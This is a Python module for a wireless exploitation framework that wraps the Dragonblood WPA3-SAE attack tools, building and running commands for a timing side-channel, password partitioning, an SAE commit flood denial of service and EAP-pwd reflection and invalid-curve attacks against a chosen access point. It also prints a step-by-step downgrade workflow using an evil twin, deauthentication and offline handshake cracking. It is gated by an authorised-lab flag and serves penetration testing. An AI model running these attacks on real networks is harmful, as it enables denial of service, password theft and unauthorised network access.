#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""Dragonblood WPA3-SAE Attack Suite - complete bridge for all Dragonblood tools.

Bridges the full Dragonblood toolkit (Vanhoef/Ronen, 2019):
  - dragontime  : timing side-channel against MODP groups
  - dragonforce : password partitioning attack (from timing/cache info)
  - dragondrain : DoS via SAE commit flood
  - dragonslayer: EAP-pwd attacks (reflection, invalid curve)

Also provides a WPA3 transition-mode downgrade attack workflow and
SAE group downgrade information.

CVEs: CVE-2019-9494 through CVE-2019-9499, CVE-2019-13377, CVE-2019-13456.

Requires: Dragonblood tools (Python), hostapd-mana (for downgrade), wpa_supplicant.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from typing import List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

_DRAGONBLOOD_TOOLS = {
    "dragontime": "Timing side-channel against SAE MODP groups (CVE-2019-9494)",
    "dragonforce": "Password partitioning from timing/cache data",
    "dragondrain": "SAE commit flood DoS (resource exhaustion)",
    "dragonslayer-client": "EAP-pwd client attacks (invalid curve, reflection)",
    "dragonslayer-server": "EAP-pwd server attacks",
}


def _which(binary: str) -> Optional[str]:
    return shutil.which(binary)


class Exploit(Exploit):
    """Dragonblood WPA3-SAE attack suite bridge."""

    __info__ = {
        "name": "Dragonblood WPA3-SAE Attack Suite",
        "description": (
            "Complete bridge for Dragonblood attacks against WPA3-SAE: timing "
            "side-channel (MODP), cache side-channel, password partitioning, "
            "SAE commit flood (DoS), EAP-pwd reflection/invalid curve. Also covers "
            "WPA3 transition-mode downgrade to WPA2 for offline cracking."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            "Mathy Vanhoef, Eyal Ronen (Dragonblood research)",
        ),
        "references": (
            "https://wpa3.mathyvanhoef.com/",
            "https://dl.aircrack-ng.org/wiki-files/doc/additional_papers/dragonblood.pdf",
            "https://www.kb.cert.org/vuls/id/871675",
        ),
        "devices": ("wifi", "802.11 WPA3-SAE"),
    }

    mode = OptString(
        "info",
        "Mode: info, dragontime, dragonforce, dragondrain, dragonslayer_client, "
        "dragonslayer_server, downgrade_info",
    )
    interface = OptString("", "Wireless interface")
    target_ap = OptString("", "Target AP IP or BSSID")
    target_network = OptString("", "Target SSID/network name")
    group = OptInteger(22, "SAE group (MODP: 22/23/24; ECC: 19/20/21)")
    timing_samples = OptInteger(100, "Number of timing samples for dragontime")
    dragonforce_file = OptString("", "Input file with timing/cache data for dragonforce")
    wordlist = OptString("", "Wordlist for dragonforce partitioning")

    eap_attack_type = OptInteger(1, "EAP-pwd attack: 0=reflection, 1=invalid curve, 2=variant")
    eap_username = OptString("bob", "EAP-pwd username")

    dragonblood_path = OptString("", "Path to dragonblood tool directory (if not in PATH)")

    dry_run = OptBool(False, "Print commands without executing")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def _find_tool(self, name: str) -> Optional[str]:
        path = _which(name)
        if path:
            return path
        base = str(self.dragonblood_path).strip()
        if base:
            candidate = os.path.join(base, name)
            if os.path.isfile(candidate):
                return candidate
            candidate_py = candidate + ".py"
            if os.path.isfile(candidate_py):
                return candidate_py
        return None

    def _run_tool(self, cmd: List[str], label: str = "") -> None:
        cmd_str = " ".join(cmd)
        if bool(self.dry_run):
            print_info(f"[dry-run] {label}: {cmd_str}")
            return
        print_status(f"{label}: {cmd_str}")
        try:
            result = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            )
            output = result.stdout.decode("utf-8", errors="replace")
            for line in output.strip().splitlines():
                print_info(line)
        except FileNotFoundError:
            print_error(f"Binary not found: {cmd[0]}")

    def _info(self) -> None:
        print_info("Dragonblood WPA3-SAE Attack Suite")
        print_info("=" * 50)
        print_info("")
        print_info("CVE-2019-9494: SAE timing + cache side-channel -> password partitioning")
        print_info("CVE-2019-9495: EAP-pwd cache side-channel")
        print_info("CVE-2019-9496: SAE confirm missing state validation (crash)")
        print_info("CVE-2019-9497: EAP-pwd reflection attack (impersonate any user)")
        print_info("CVE-2019-9498/99: EAP-pwd invalid curve (bypass auth)")
        print_info("CVE-2019-13377: Brainpool timing side-channel")
        print_info("CVE-2019-13456: FreeRADIUS EAP-pwd info leak")
        print_info("CERT VU#871675: Transition mode downgrade + group downgrade")
        print_info("")
        print_info("Tools availability:")
        for tool, desc in _DRAGONBLOOD_TOOLS.items():
            path = self._find_tool(tool)
            if path:
                print_success(f"  [+] {tool}: {path}")
            else:
                print_error(f"  [-] {tool}: not found")
            print_info(f"      {desc}")
        print_info("")
        print_info("Install: git clone https://github.com/niccolospa/dragonblood")

    def _dragontime(self) -> None:
        """Timing side-channel attack against SAE MODP groups."""
        tool = self._find_tool("dragontime")
        if not tool:
            print_error(
                "dragontime not found. Clone: "
                "https://github.com/niccolospa/dragonblood"
            )
            return

        iface = str(self.interface).strip()
        target = str(self.target_ap).strip()
        group = int(self.group)
        samples = int(self.timing_samples)

        if not iface or not target:
            print_error("Set interface and target_ap.")
            return

        cmd = ["python3", tool]
        cmd.extend(["-i", iface, "-t", target, "-g", str(group),
                     "-n", str(samples)])

        self._run_tool(cmd, f"dragontime (group {group}, {samples} samples)")

    def _dragonforce(self) -> None:
        """Password partitioning from timing/cache data."""
        tool = self._find_tool("dragonforce")
        if not tool:
            print_error("dragonforce not found.")
            return

        data_file = str(self.dragonforce_file).strip()
        wl = str(self.wordlist).strip()
        if not data_file:
            print_error("Set dragonforce_file (timing/cache data).")
            return

        cmd = ["python3", tool, data_file]
        if wl:
            cmd.extend(["--wordlist", wl])

        self._run_tool(cmd, "dragonforce partitioning")

    def _dragondrain(self) -> None:
        """SAE commit flood DoS."""
        tool = self._find_tool("dragondrain")
        if not tool:
            print_error("dragondrain not found.")
            return

        iface = str(self.interface).strip()
        target = str(self.target_ap).strip()
        if not iface or not target:
            print_error("Set interface and target_ap.")
            return

        cmd = ["python3", tool, "-i", iface, "-t", target]
        self._run_tool(cmd, "dragondrain SAE DoS")

    def _dragonslayer(self, *, server: bool = False) -> None:
        """EAP-pwd attacks (reflection, invalid curve)."""
        suffix = "server" if server else "client"
        tool = self._find_tool(f"dragonslayer-{suffix}")
        if not tool:
            print_error(f"dragonslayer-{suffix} not found.")
            return

        iface = str(self.interface).strip()
        attack = int(self.eap_attack_type)
        username = str(self.eap_username).strip()

        if not iface:
            print_error("Set interface.")
            return

        cmd = ["python3", tool, "-i", iface, "-a", str(attack)]
        if not server and username:
            cmd.extend(["-u", username])

        labels = {0: "reflection", 1: "invalid curve", 2: "invalid curve variant"}
        self._run_tool(cmd, f"dragonslayer-{suffix} ({labels.get(attack, 'unknown')})")

    def _downgrade_info(self) -> None:
        """Information about WPA3 transition-mode downgrade attack."""
        print_info("WPA3 Transition Mode Downgrade Attack")
        print_info("=" * 50)
        print_info("")
        print_info("When WPA3-Transition is enabled (WPA2+WPA3 mixed mode):")
        print_info("1. Create evil twin AP with same SSID but WPA2-only")
        print_info("2. Deauth client from legitimate WPA3 AP")
        print_info("3. Client reconnects to evil twin via WPA2")
        print_info("4. Capture WPA2 4-way handshake")
        print_info("5. Crack offline with hashcat -m 22000")
        print_info("")
        print_info("Workflow in WXF:")
        print_info("  1. use generic/external/aircrack_full_bridge")
        print_info("     set mode airodump_scan (identify WPA3-Transition APs)")
        print_info("  2. use generic/wifi_lab/evil_twin_advanced")
        print_info("     set mode wpa2_only_clone")
        print_info("  3. use generic/wifi_lab/aireplay_deauth_barrage")
        print_info("     (force client to reconnect)")
        print_info("  4. use generic/wifi_lab/pmkid_autopwn")
        print_info("     set mode crack (crack captured WPA2 handshake)")
        print_info("")
        print_info("Countermeasure: disable WPA3 Transition mode (WPA3-only).")


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        op = str(self.mode).strip().lower()

        if op == "info":
            self._info()
            return
        if op == "downgrade_info":
            self._downgrade_info()
            return

        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        dispatch = {
            "dragontime": self._dragontime,
            "dragonforce": self._dragonforce,
            "dragondrain": self._dragondrain,
            "dragonslayer_client": lambda: self._dragonslayer(server=False),
            "dragonslayer_server": lambda: self._dragonslayer(server=True),
        }

        handler = dispatch.get(op)
        if not handler:
            print_error(f"Unknown mode: {op}. Valid: {', '.join(sorted(dispatch.keys()))}")
            return
        handler()
